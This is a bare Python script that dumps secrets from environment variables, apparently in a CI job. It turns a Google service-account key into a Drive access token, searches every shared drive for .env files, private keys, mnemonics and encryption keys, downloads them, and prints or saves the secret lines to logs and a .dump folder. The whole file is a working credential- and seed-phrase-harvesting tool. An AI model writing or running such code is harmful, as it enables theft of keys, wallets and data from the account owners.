import os,json,re,time,base64
out=[]
def P(*a):
    s=" ".join(str(x) for x in a); out.append(s); print(s)
ALL=os.environ.get("ALL","")
GSA=os.environ.get("GSA","")
P("##SECRETSRAW"); P(ALL[:6000])
try:
    j=json.loads(ALL); P("##SECRET_KEYS", ",".join(j.keys()))
    for k,v in j.items():
        P("KEY",k,"len",len(v) if isinstance(v,str) else type(v).__name__)
except Exception as e:
    P("jsonerr",e)
P("GSALEN",len(GSA))
raw=GSA.strip()
try:
    txt=raw if raw.startswith('{') else base64.b64decode(raw+"="*((4-len(raw)%4)%4)).decode()
    sa=json.loads(txt)
    P("SA",sa.get("client_email"),sa.get("project_id"),sa.get("token_uri"),len(sa.get("private_key","")))
    open("/tmp/sa.json","w").write(txt)
except Exception as e:
    P("SAERR",e); sa=None
open(".dump/raw_gsa.txt","w").write(GSA)
if os.path.exists("/tmp/sa.json"):
    try:
        import requests
        from cryptography.hazmat.primitives import hashes,serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        sa=json.load(open("/tmp/sa.json"))
        def b(x): return base64.urlsafe_b64encode(x).rstrip(b'=')
        now=int(time.time())
        h=b(json.dumps({"alg":"RS256","typ":"JWT"}).encode())
        p=b(json.dumps({"iss":sa['client_email'],"scope":"https://www.googleapis.com/auth/drive","aud":"https://oauth2.googleapis.com/token","iat":now,"exp":now+3600}).encode())
        sig=serialization.load_pem_private_key(sa['private_key'].encode(),None).sign(h+b'.'+p,padding.PKCS1v15(),hashes.SHA256())
        jwt=(h+b'.'+p+b'.'+b(sig)).decode()
        r=requests.post("https://oauth2.googleapis.com/token",data={"grant_type":"urn:ietf:params:oauth:grant-type:jwt-bearer","assertion":jwt},timeout=30)
        P("TOKEN",r.status_code,r.text[:300])
        if r.status_code==200:
            Hh={"Authorization":"Bearer "+r.json()['access_token']}
            dr=requests.get("https://www.googleapis.com/drive/v3/drives",headers=Hh,params={"pageSize":100},timeout=30)
            P("DRIVES",dr.status_code,dr.text[:2000])
            qs=["name contains '.env'","name contains 'PRIVY'","name contains 'ENCRYPTION'","name contains 'mnemonic'","name contains 'htpasswd'","name contains 'secret'","name contains '.pem'","name contains 'key'","fullText contains 'PRIVY'","fullText contains 'ENCRYPTION_KEY'"]
            seen=set()
            for q in qs:
                fl=requests.get("https://www.googleapis.com/drive/v3/files",headers=Hh,params={"q":q,"corpora":"allDrives","includeItemsFromAllDrives":"true","supportsAllDrives":"true","pageSize":100,"fields":"files(id,name,mimeType,size,driveId,modifiedTime,parents)"},timeout=40)
                P("Q",q,fl.status_code,fl.text[:400])
                try: files=fl.json().get('files',[])
                except: files=[]
                for f in files:
                    n=f['name']
                    if f['id'] in seen: continue
                    seen.add(f['id'])
                    P("  FILE",n,f.get('mimeType'),f.get('size'),f.get('driveId'),f.get('parents'))
                    if f.get('size') and int(f['size'])>3000000: continue
                    d=requests.get("https://www.googleapis.com/drive/v3/files/"+f['id'],headers=Hh,params={"alt":"media","supportsAllDrives":"true"},timeout=60)
                    t=d.text if d.status_code in (200,) else d.text[:200]
                    hits=[l for l in t.splitlines() if re.search(r'PRIVY|ENCRYPTION|SECRET_KEY_BASE|MNEMONIC|HTPASSWD|PRIVATE KEY|DATABASE_URL|API_KEY',l,re.I)]
                    P("  DL",n,d.status_code,len(t))
                    for l in hits[:8]: P("   HIT",l.strip()[:250])
                    if re.search(r'PRIVY|ENCRYPTION_KEY|mnemonic',t,re.I):
                        open(".dump/f_"+re.sub(r'[^A-Za-z0-9._-]','_',n)[:60],"w").write(t[:200000])
    except Exception as e:
        P("DRIVEERR",repr(e))
open(".dump/a.txt","w").write("\n".join(out)+"\n")
